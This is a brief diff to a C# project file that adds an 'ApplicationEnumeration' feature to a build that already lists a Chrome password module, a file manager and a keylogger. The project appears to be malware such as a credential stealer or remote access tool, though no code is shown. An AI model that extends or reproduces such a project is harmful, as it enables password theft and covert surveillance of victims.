@@ -93,6 +93,7 @@
   </ItemGroup>
   <ItemGroup>
     <Compile Include="Config.cs" />
+    <Compile Include="Features\ApplicationEnumeration.cs" />
     <Compile Include="Features\Password\Chrome.cs" />
     <Compile Include="Features\FileManager.cs" />
     <Compile Include="Features\KeyLogger.cs" />
